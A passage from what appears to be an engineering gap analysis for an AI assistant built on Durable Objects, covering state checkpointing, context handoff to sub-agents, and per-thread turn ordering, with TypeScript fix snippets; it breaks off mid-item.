Define and document a strict ownership rule, and persist anything that must survive: ``` // Ownership contract: // - this.state (synced): small, client-visible UI state only (status, progress) // - SQLite (durable): anything that must survive eviction or be queried // - instance fields: request-scoped scratch ONLY; never relied on across awaits ``` ```typescript // Persist working state explicitly at each await boundary that could hibernate await this.ctx.storage.put("loop_checkpoint", { step, partialResult }); // On wake, restore from storage, never from a remembered field const cp = await this.ctx.storage.get("loop_checkpoint"); ```

G-W28 HIGH §Orchestration — Handoff — AssistantDO / context transfer

Sub-agent spawn passes only a task description — conversation, memory, and intermediate context are lost

The Gap

When the assistant spawns a sub-agent, the only context transferred is the task description string. The parent's conversation history, relevant Memory OS facts, system prompt, and any intermediate results are not handed off. A sub-agent asked to "research the competitor mentioned earlier" has no access to "earlier," so it either fails or hallucinates. There is no atomic handoff primitive that snapshots and transfers the needed context.

Required Fix

Define a handoff payload that snapshots scoped context atomically: ```typescript async spawnSubAgent(task: SubAgentTask) { const handoff = { task: task.description, // Curated, scoped context — not the whole history relevantMemory: await this.recallForTask(task.description, { topK: 8 }), recentMessages: await this.getRecentMessages(10), parentRef: { spaceId: this.spaceId, threadId: this.threadId, agentId: this.id.toString() }, handoffId: crypto.randomUUID(), }; // Persist the handoff so it survives parent eviction (see G-W30) this.ctx.storage.sql.exec("INSERT INTO handoffs (id, payload, status) VALUES (?,?,'sent')", handoff.handoffId, JSON.stringify(handoff)); return dispatchSubAgent(handoff); } ```

G-W29 HIGH §Orchestration — Concurrency — NaelaoAgentDO / per-thread queue

Two messages to the same thread interleave — no explicit queue guarantees ordered, non-overlapping turns

The Gap

When two requests target the same thread concurrently (user double-sends, or a client retries), the DO serializes individual handler invocations but there is no explicit turn queue. A second message can begin a new LLM turn while the first turn's tool results are still being persisted, interleaving messages in the history and producing a corrupted, non-causal transcript. The single-threaded DO model protects individual storage ops, not the multi-await logical turn.

Required Fix
